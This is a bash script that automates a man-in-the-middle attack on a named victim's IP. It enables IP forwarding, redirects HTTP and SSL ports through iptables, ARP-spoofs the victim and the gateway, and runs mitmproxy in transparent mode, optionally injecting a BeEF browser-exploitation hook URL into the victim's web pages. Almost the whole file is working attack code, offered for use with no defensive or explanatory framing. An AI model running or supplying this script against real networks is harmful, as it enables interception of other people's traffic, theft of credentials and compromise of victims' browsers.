#!/bin/bash

clear

####################################################################################
#
#Page 1: Settings
#
####################################################################################
echo
echo -e " \e[32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱"
echo -e " ╭━╮╭━┳━━┳━━━━┳━╮╭━╮╱╱╱╱╭━━╮╱╱╱╭━━━┳━━━╮"
echo -e " ┃┃╰╯┃┣┫┣┫╭╮╭╮┃┃╰╯┃┃╱╱╱╱┃╭╮┃╱╱╱┃╭━━┫╭━━╯"
echo -e " ┃╭╮╭╮┃┃┃╰╯┃┃╰┫╭╮╭╮┃╱╱╱╱┃╰╯╰┳━━┫╰━━┫╰━━╮"
echo -e " ┃┃┃┃┃┃┃┃╱╱┃┃╱┃┃┃┃┃┃╭━━╮┃╭━╮┃┃━┫╭━━┫╭━━╯"
echo -e " ┃┃┃┃┃┣┫┣╮╱┃┃╱┃┃┃┃┃┃╰━━╯┃╰━╯┃┃━┫╰━━┫┃╱╱╱"
echo -e " ╰╯╰╯╰┻━━╯╱╰╯╱╰╯╰╯╰╯╱╱╱╱╰━━━┻━━┻━━━┻╯╱╱╱"
echo -e " ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[0mby: Odyssee\e[32m╱╱╱╱\e[0m"
echo 
echo
echo -e "\e[1m Network interface \e[21m(eg. eth0,...)"
read IFACE
#check for no response
if [ -z $IFACE ]; then
	echo Please enter a network interface.
	echo
	exit 
fi
echo
echo -e "\e[1m Victim's IP:\e[21m"
read VICTIM
#check for no response
if [ -z $VICTIM ]; then
	echo Please enter a network interface.
	echo
	exit
fi
#gateway
echo
echo -e "\e[1m What is the gateway? \e[21m "
read GATE
echo
#check for no response
if [ -z $GATE ]; then
	echo -e "\e[1m Please enter a gateway. \e[21m"
	echo
	exit
fi
clear

######################################################################################
#
#Page 1.1: html & ssl
#
######################################################################################
echo
echo -e " \e[32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱"
echo -e " ╭━╮╭━┳━━┳━━━━┳━╮╭━╮╱╱╱╱╭━━╮╱╱╱╭━━━┳━━━╮"
echo -e " ┃┃╰╯┃┣┫┣┫╭╮╭╮┃┃╰╯┃┃╱╱╱╱┃╭╮┃╱╱╱┃╭━━┫╭━━╯"
echo -e " ┃╭╮╭╮┃┃┃╰╯┃┃╰┫╭╮╭╮┃╱╱╱╱┃╰╯╰┳━━┫╰━━┫╰━━╮"
echo -e " ┃┃┃┃┃┃┃┃╱╱┃┃╱┃┃┃┃┃┃╭━━╮┃╭━╮┃┃━┫╭━━┫╭━━╯"
echo -e " ┃┃┃┃┃┣┫┣╮╱┃┃╱┃┃┃┃┃┃╰━━╯┃╰━╯┃┃━┫╰━━┫┃╱╱╱"
echo -e " ╰╯╰╯╰┻━━╯╱╰╯╱╰╯╰╯╰╯╱╱╱╱╰━━━┻━━┻━━━┻╯╱╱╱"
echo -e " ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[0mby: Odyssee\e[32m╱╱╱╱\e[0m"
echo 
echo
echo -e "\e[1m Please enter HTTP port: \e[21m"
read HTTP
#check for no response
if [ -z $HTTP ]; then
	echo "Please enter HTTP port."
	echo
	exit
fi

echo
echo -e "\e[1m Please enter SSL port: \e[21m " 
read SSL
#check for no response
if [ -z $SSL ]; then
	echo -e "\e[1m Please enter SSL port. \e[21m "
	echo
	exit
fi
echo
clear

##########################################################################################
#
#Page 2: BeEF
#
#########################################################################################
echo
echo -e " \e[32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱"
echo -e " ╭━╮╭━┳━━┳━━━━┳━╮╭━╮╱╱╱╱╭━━╮╱╱╱╭━━━┳━━━╮"
echo -e " ┃┃╰╯┃┣┫┣┫╭╮╭╮┃┃╰╯┃┃╱╱╱╱┃╭╮┃╱╱╱┃╭━━┫╭━━╯"
echo -e " ┃╭╮╭╮┃┃┃╰╯┃┃╰┫╭╮╭╮┃╱╱╱╱┃╰╯╰┳━━┫╰━━┫╰━━╮"
echo -e " ┃┃┃┃┃┃┃┃╱╱┃┃╱┃┃┃┃┃┃╭━━╮┃╭━╮┃┃━┫╭━━┫╭━━╯"
echo -e " ┃┃┃┃┃┣┫┣╮╱┃┃╱┃┃┃┃┃┃╰━━╯┃╰━╯┃┃━┫╰━━┫┃╱╱╱"
echo -e " ╰╯╰╯╰┻━━╯╱╰╯╱╰╯╰╯╰╯╱╱╱╱╰━━━┻━━┻━━━┻╯╱╱╱"
echo -e " ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[0mby: Odyssee\e[32m╱╱╱╱\e[0m"
echo 
#Inject BeEF
echo
echo -e "\e[1m Do you want to inject a BeEF hook? \e[21m(Y/n)"
read answer
if [[ $answer == "Y" || $answer == "y" ]]; then 
	clear
	clear
	echo
	echo -e "\e[1m Hook url: \e[21m "
	read HOOK
	clear
fi
clear

##################################################################################
#
#Page 3: Confirm Information
#
##################################################################################
echo
echo -e " \e[32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱"
echo -e " ╭━╮╭━┳━━┳━━━━┳━╮╭━╮╱╱╱╱╭━━╮╱╱╱╭━━━┳━━━╮"
echo -e " ┃┃╰╯┃┣┫┣┫╭╮╭╮┃┃╰╯┃┃╱╱╱╱┃╭╮┃╱╱╱┃╭━━┫╭━━╯"
echo -e " ┃╭╮╭╮┃┃┃╰╯┃┃╰┫╭╮╭╮┃╱╱╱╱┃╰╯╰┳━━┫╰━━┫╰━━╮"
echo -e " ┃┃┃┃┃┃┃┃╱╱┃┃╱┃┃┃┃┃┃╭━━╮┃╭━╮┃┃━┫╭━━┫╭━━╯"
echo -e " ┃┃┃┃┃┣┫┣╮╱┃┃╱┃┃┃┃┃┃╰━━╯┃╰━╯┃┃━┫╰━━┫┃╱╱╱"
echo -e " ╰╯╰╯╰┻━━╯╱╰╯╱╰╯╰╯╰╯╱╱╱╱╰━━━┻━━┻━━━┻╯╱╱╱"
echo -e " ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[0mby: Odyssee\e[32m╱╱╱╱\e[0m"
echo 
#check information
echo
echo -e "\e[1m You entered the following information:"
echo
echo -e "\e[1m Network interface: \e[21m$IFACE"
echo -e "\e[1m Victim's IP: \e[21m$VICTIM"
echo -e "\e[1m Network gateway: \e[21m$GATE"
echo -e "\e[1m BeEF hook url: \e[21m$HOOK"
echo

#Confirm information
echo -e "\e[1m Is this information correct? \e[21m(Y/n)"
read a
if [[ $a == "N" || $a == "n" ]]; then 
	exit
fi
clear	

##########################################################################################
#
#Page 4: Firewall and forwarding
#
##########################################################################################
echo
echo -e " \e[32m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱"
echo -e " ╭━╮╭━┳━━┳━━━━┳━╮╭━╮╱╱╱╱╭━━╮╱╱╱╭━━━┳━━━╮"
echo -e " ┃┃╰╯┃┣┫┣┫╭╮╭╮┃┃╰╯┃┃╱╱╱╱┃╭╮┃╱╱╱┃╭━━┫╭━━╯"
echo -e " ┃╭╮╭╮┃┃┃╰╯┃┃╰┫╭╮╭╮┃╱╱╱╱┃╰╯╰┳━━┫╰━━┫╰━━╮"
echo -e " ┃┃┃┃┃┃┃┃╱╱┃┃╱┃┃┃┃┃┃╭━━╮┃╭━╮┃┃━┫╭━━┫╭━━╯"
echo -e " ┃┃┃┃┃┣┫┣╮╱┃┃╱┃┃┃┃┃┃╰━━╯┃╰━╯┃┃━┫╰━━┫┃╱╱╱"
echo -e " ╰╯╰╯╰┻━━╯╱╰╯╱╰╯╰╯╰╯╱╱╱╱╰━━━┻━━┻━━━┻╯╱╱╱"
echo -e " ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱\e[0mby: Odyssee\e[32m╱╱╱╱\e[0m"
echo 
#firewal and forwarding
echo
echo -e "\e[1m Enabling ipv4 forwarding... \e[21m"
sleep 2
sysctl -w net.ipv4.ip_forward=1
echo
echo -e "\e[1m Setting up firewall & redirecting traffic to port 8080... \e[21m"
	iptables -t nat -A PREROUTING -i eth0 -p tcp --dport $HTTP -j REDIRECT --to-port 8080
	iptables -t nat -A PREROUTING -i eth0 -p tcp --dport $SSL -j REDIRECT --to-port 8080
sleep 2
echo
echo -e "\e[1m Setup succesfull!"
echo -e " Do you want to continue? \e[21m(Y/n)"
read a
if [[ $a == "N" || $a == "n" ]]; then 
	exit
fi
clear

#######################################################################################
#
#Page 5: Attack!
#
######################################################################################""

#ARPSPOOF
	arpspoof -i $IFACE -t $VICTIM $GATE & >/dev/null 
	arpspoof -i $IFACE -t $GATE $VICTIM & >/dev/null 

#initiate attack
if [ -z $HOOK]; then
	xterm -hold -e mitmproxy -T --host
else
	xterm -hold -e mitmproxy -T --host -s "mitm-beef/js_injector.py $HOOK"
fi

